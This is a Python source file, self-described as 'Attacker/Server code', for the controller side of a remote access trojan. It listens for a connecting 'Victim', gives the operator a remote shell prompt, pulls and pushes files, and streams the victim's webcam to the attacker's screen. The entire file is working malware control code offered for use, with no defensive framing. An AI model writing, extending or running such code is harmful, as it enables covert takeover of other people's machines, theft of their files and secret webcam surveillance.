"""
Filename : server.py
Author : @SPR-Ideas
Attacker/Server code
USAGE : Need to change the LISTEN PORT and LISTEN_IP
        as per your Preference.
"""
import os, sys
import socket

import pickle
import cv2

# Change this :
LISTEN_IP = 'localhost'
LISTEN_PORT = 9000
 
def send_file(socket, file_name):
    client = socket
    data = b''
    file_size = os.stat(file_name).st_size
    f = open(file_name,'rb')
    data = f.read(file_size)
    f.close()
    file_size = os.stat(file_name).st_size
    client.send(str(file_size).ljust(20).encode())
    client.sendall(data)

def get_times(size):
    times = 0
    max_size = 64*1024
    no_iterations = size/max_size
    if no_iterations <= 0:
        times = 1
    elif no_iterations <=20:
        times = 10
    else:
        times = 64
    return times

def get_file(client,filename):
    global percent ,get_pwd
    times = 0
    file_size = client.recv(20).decode()
    times = get_times(int(file_size))
    data =b''

    while True:
        k = "="*int(percent//5)
        st = k+">"
        print("downloading.."+" "*20+"["+st.ljust(20)+"]"+str(len(data))+"/"+file_size,end="\r")
        d = client.recv(times*1024)
        if not d:
            break
        percent = len(data)*100//int(file_size)
        data += d
        u = len(data)
        if u >= int(file_size):
            data = data[:int(file_size)]
            get_pwd = False
            print("downloading.."+" "*20+"["+st.ljust(20)+"]"+str(len(data))+"/"+file_size,end="\r")
            print()
            break
    with open(filename,'wb') as k:
        k.write(data)

def live_cam(socket):
    global get_pwd
    client_socket = socket
    data = b""
    Header = 10
    while True:
        while len(data) < Header:
            d  = (client_socket.recv(1024))
            data+=d
            if not d:
                break
        msg_len = data[:Header]
        data = data[Header:]
        msg_len = int(msg_len.decode())
        while len(data) < msg_len:
            data += (client_socket.recv(1024))
        frame  = data[:msg_len]
        data = data[msg_len:]
        try:
            frame = pickle.loads(frame)
        except:
            get_pwd = False
            break
        cv2.imshow("RECEIVING VIDEO",frame)
        key = cv2.waitKey(1) & 0xFF
        if key  == ord('q'):
            print("clicked......")
            client_socket.send("end".ljust(10).encode())


def main(pwdlen, get_pwd):
    if not get_pwd:
        pwdlen = int(client.recv(10).decode())
        pwd = client.recv(pwdlen).decode()
        get_pwd = True
    msg = input(pwd+" $ ")
    msglen = len(msg)
    client.send(str(msglen).ljust(10).encode())
    client.send(msg.encode())
    if msg == 'exit':
        return False
    if "livecam" in msg :
        live_cam(client)
    elif "download" in msg :
        file_name = msg.split("-")[1].strip()
        get_file(client,file_name)
    elif "upload" in msg :
        file_name = msg.split("-")[1].strip()
        send_file(client,file_name)
    else:
        outlen = int(client.recv(10).decode())
        out = client.recv(outlen).decode()
        print(out)

if __name__  == "__main__":

    server = socket.socket()
    server.bind((LISTEN_IP, LISTEN_PORT))

    server.listen(1)
    client,addr = server.accept()

    print("Victim Address: {}:{}\n".format(*addr))

    percent, pwdlen = 0,0
    get_pwd = False
    
    while True:
        main(pwdlen, get_pwd)

    client.close()
    
    sys.exit(0)
